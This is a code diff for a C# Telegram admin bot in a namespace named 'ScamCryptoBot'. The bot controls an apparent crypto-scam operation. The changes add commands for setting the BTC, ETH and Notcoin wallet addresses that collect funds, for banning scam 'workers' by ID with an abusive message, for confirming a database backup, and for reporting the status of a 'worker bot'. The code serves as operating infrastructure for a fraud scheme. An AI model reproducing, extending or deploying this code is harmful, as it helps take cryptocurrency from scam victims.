@@ -27,10 +27,9 @@ namespace ScamCryptoBot
                                 if (msg.Text == "/start" && chat.Id == LocalConfig.adminMainId || DataBase.IsAdmin(Convert.ToInt32(chat.Id)))
                                 {
                                     await bot.DeleteMessageAsync(chat.Id, msg.MessageId);
-                                    string text = $"❤️‍🔥 {chat.FirstName}, с возвращением!\n" +
-                                        $"🤖 Я - главный бот управления всей экосистемой 🌳\n" +
-                                        $"⚙️ Разработчик: @WH3BABY\n" +
-                                        $"👇 Клавиатура ниже в твоем распоряжении";
+                                    string text = $"❤️‍🔥 {chat.FirstName}, с возвращением!\n " +
+                                        $"⚙️ Разработчик: @WH3BABY\n";
+                                  
                                     await bot.SendTextMessageAsync(chat.Id, text,replyMarkup:MainKeyBoard.MainMenu(),parseMode:ParseMode.Html);
                                     break;
                                 }
@@ -73,6 +72,57 @@ namespace ScamCryptoBot
                                         await bot.SendTextMessageAsync(chat.Id, "Пользователь технической поддержки успешно добавлен в базу.", replyMarkup: MainKeyBoard.ConfigPanel());
                                    
                                         LocalConfig.setNewTP = false;
+                                    }
+                                }
+                                // Set BTC wallet
+                                if (LocalConfig.setNewbtcWallet) 
+                                {
+                                    string wallet = msg.Text;
+                                    if (!string.IsNullOrEmpty(wallet)) 
+                                    {
+                                        await bot.DeleteMessageAsync(chat.Id, msg.MessageId);
+                                        LocalConfig.btcWalletAddress = wallet;
+                                        await bot.SendTextMessageAsync(chat.Id, $"BTC Кошелек с адресом:\n<code>{wallet}</code>\n<b>Успешно установлен!</b>", parseMode: ParseMode.Html);
+                                        LocalConfig.setNewbtcWallet = false;
+                                    }
+                                }
+                                // Set ETH wallet
+                                if (LocalConfig.setNewETHWallet)
+                                {
+                                    string wallet = msg.Text;
+                                    if (!string.IsNullOrEmpty(wallet)) 
+                                    {
+                                        await bot.DeleteMessageAsync(chat.Id, msg.MessageId);
+                                        LocalConfig.ethWalletAddress = wallet;
+                                        await bot.SendTextMessageAsync(chat.Id, $"ETH Кошелек с адресом:\n<code>{wallet}</code>\n<b>Успешно установлен!</b>", parseMode: ParseMode.Html);
+                                        LocalConfig.setNewETHWallet = false;
+                                    }
+                                }
+                                // Set NOT Wallet
+                                if (LocalConfig.setNewNOTWallet) 
+                                {
+                                    string wallet = msg.Text;
+                                    if (!string.IsNullOrEmpty(wallet)) 
+                                    {
+                                        await bot.DeleteMessageAsync(chat.Id, msg.MessageId);
+                                        LocalConfig.notcoinWalletAddress = wallet;
+                                        await bot.SendTextMessageAsync(chat.Id, $"NOT Кошелек с адресом:\n<code>{wallet}</code>\n<b>Успешно установлен!</b>", parseMode: ParseMode.Html);
+                                        LocalConfig.setNewNOTWallet = false;
+
+                                    }
+                                }
+                                // Ban user
+                                if (LocalConfig.setBanState) 
+                                {
+                                    int idToBan = Convert.ToInt32(msg.Text);
+                                    if(idToBan > 0) 
+                                    {
+                                        await bot.DeleteMessageAsync(chat.Id, msg.MessageId);
+                                        DataBase.addToBanIDs(idToBan);
+                                        await bot.SendTextMessageAsync(chat.Id, "Говноед забанен навсегда.");
+                                        // Пошлем телеграму, что черт отлетел в банчик
+                                        worker.Run.telegramClient.SendTextMessageAsync(idToBan, $"<b>Доступ к сервисам проекта был аннулирован навсегда!</b>", parseMode: ParseMode.Html);
+                                        LocalConfig.setBanState = false;
                                     }
                                 }
                                 break;
@@ -123,6 +173,21 @@ namespace ScamCryptoBot
                                     $"Notcoin: {not}";
                                 await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id , text, replyMarkup:MainKeyBoard.ConfiguratorWalletsPanel(),parseMode:ParseMode.Html );
                                 break;
+                            case "mbtn_config_wallets_btc": // Set btc wallet address
+                                await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "Пришлите адрес BTC кошелька", parseMode: ParseMode.Html);
+                                LocalConfig.setNewbtcWallet = true;
+                                break;
+                            case "mbtn_config_wallets_eth": // Set ETH address
+                                await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "Пришлите адрес ETH кошелька", parseMode: ParseMode.Html);
+                                LocalConfig.setNewETHWallet = true;
+                                break;
+                            case "mbtn_config_wallets_notcoin": // Set $NOT adrs
+                                await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "Пришлите адрес NOT кошелька", parseMode: ParseMode.Html);
+                                LocalConfig.setNewNOTWallet = true;
+                                break;
                             case "mbtn_config_back":
                                  text = "⚙️ Вы вошли в меню конфигурации всей экосистемы 🌳\n" +
                                     "Будьте осторожнее с настройками.";
@@ -141,10 +206,21 @@ namespace ScamCryptoBot
                                     await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, replyMarkup: MainKeyBoard.AdminPanel(), parseMode: ParseMode.Html);
                                 }
                                 break;
-                            // Buttons in APanel
+                            // Buckup database button in APanel
                             case "mbtn_main_backup_database":
                                 await DataBase.DataBaseRecover();
+                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "База данных успешно сохранена на хостинг, где развернут проект.");
                                 break;
+                            // Ban button in APanel;
+                            case "mbtn_main_block":
+                                await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "Пришли ID воркера для блокировки");
+                                LocalConfig.setBanState = true;
+                                break;
+                            // Emailing button in Apanel (coming soon)
+                            case "mbtn_main_emailing":
+                                break;
+                            
                                 // BotPanel
                             case "mbtn_bots_panel":
                                 if(LocalConfig.adminMainId == callbackQuery.Message.Chat.Id || DataBase.IsAdmin(Convert.ToInt32(callbackQuery.Message.Chat.Id))) 
@@ -186,7 +262,7 @@ namespace ScamCryptoBot
                                     await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, "Бот успешно остановлен",replyMarkup:MainKeyBoard.BotsPanelNotcoin());
                                 }
                                 break;
-                            // Tehlical support Notcoin bot Button
+                            // teh Notcoin bot Button
                             case "mbtn_bots_notcoin_to":
                                 if(callbackQuery.Message.Chat.Id == LocalConfig.adminMainId || DataBase.IsAdmin(Convert.ToInt32(callbackQuery.Message.Chat.Id))) 
                                 {
@@ -278,6 +354,7 @@ namespace ScamCryptoBot
                                 string notbot = "🌐 Не в сети";
                                 string btcbot = "🌐 Не в сети";
                                 string accepterBot = "🌐 Не в сети";
+                                string workerBot = "🌐 Не в сети";
 
                                 if (LocalConfig.isBTCEnable)
                                     btcbot = "📶 В сети";
@@ -285,11 +362,14 @@ namespace ScamCryptoBot
                                     notbot = "📶 В сети";
                                 if(LocalConfig.isAccepterEnable)
                                     accepterBot = "📶 В сети";
+                                if (LocalConfig.isWorkerEnabled)
+                                    workerBot = "📶 В сети";
 
                                 text = $"🖥 Актуальная информация о ботах:\n" +
                                     $"🤖 Notcoin Bot: <b>{notbot}</b>\n" +
                                     $"🤖 Бот заявочник: <b>{accepterBot}</b>\n" +
-                                    $"🤖 Btc Bot: <b>{btcbot}</b>";
+                                    $"🤖 Btc Bot: <b>{btcbot}</b>\n" +
+                                    $"🤖 Воркер бот: <b>{workerBot}</b>";
 
                                 await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id,text,replyMarkup:MainKeyBoard.ExitButton(), parseMode: ParseMode.Html);
                                 await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
